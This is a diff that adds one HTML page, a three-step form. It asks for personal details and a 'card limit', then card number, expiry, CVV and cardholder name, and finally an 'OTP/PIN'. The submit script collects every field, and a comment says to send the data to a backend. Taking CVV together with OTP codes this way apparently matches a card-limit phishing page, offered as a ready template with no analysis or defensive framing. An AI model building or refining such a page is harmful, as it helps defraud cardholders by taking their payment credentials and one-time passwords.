@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Multi-Step Form</title>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; }
+    .step { display: none; }
+    .step.active { display: block; }
+    input, select { display: block; margin-bottom: 10px; width: 100%; padding: 8px; }
+    button { padding: 10px 20px; background: orange; color: white; border: none; cursor: pointer; }
+  </style>
+</head>
+<body>
+
+<form id="multiStepForm">
+  <!-- Step 1: Personal Info -->
+  <div class="step active" id="step1">
+    <h3>Personal Information</h3>
+    <input type="text" name="name" placeholder="Name" required>
+    <input type="email" name="email" placeholder="Email" required>
+    <input type="tel" name="mobile" placeholder="Mobile no." required>
+    <input type="date" name="dob" placeholder="Date of birth" required>
+    <input type="text" name="city" placeholder="City" required>
+    <select name="device">
+      <option value="Android">Android</option>
+      <option value="iOS">iOS</option>
+    </select>
+    <input type="number" name="cardLimit" placeholder="Card Limit" required>
+    <button type="button" onclick="nextStep(2)">Proceed</button>
+  </div>
+
+  <!-- Step 2: Card Details -->
+  <div class="step" id="step2">
+    <h3>Card Details</h3>
+    <input type="text" name="cardNumber" placeholder="Card Number" required>
+    <select name="expMonth">
+      <option value="01">01</option>
+      <option value="02">02</option>
+      <!-- Add other months -->
+    </select>
+    <select name="expYear">
+      <option value="24">2024</option>
+      <option value="25">2025</option>
+      <!-- Add more years -->
+    </select>
+    <input type="text" name="cvv" placeholder="CVV" required>
+    <input type="text" name="cardHolderName" placeholder="Card Holder Name" required>
+    <button type="button" onclick="nextStep(3)">Submit</button>
+  </div>
+
+  <!-- Step 3: OTP -->
+  <div class="step" id="step3">
+    <h3>OTP Verification</h3>
+    <input type="text" name="otp" placeholder="Enter OTP/PIN" required>
+    <button type="submit">Submit</button>
+  </div>
+</form>
+
+<script>
+  function nextStep(step) {
+    document.querySelectorAll('.step').forEach(div => div.classList.remove('active'));
+    document.getElementById('step' + step).classList.add('active');
+  }
+
+  document.getElementById('multiStepForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const formData = new FormData(this);
+    const allData = {};
+    for (let [key, value] of formData.entries()) {
+      allData[key] = value;
+    }
+
+    // 📤 You need to send this data to your backend here.
+    console.log('Form Data to Send:', allData);
+
+    alert("Form submitted successfully!");
+    // Optionally reset
+    // this.reset();
+  });
+</script>
+
+</body>
+</html>
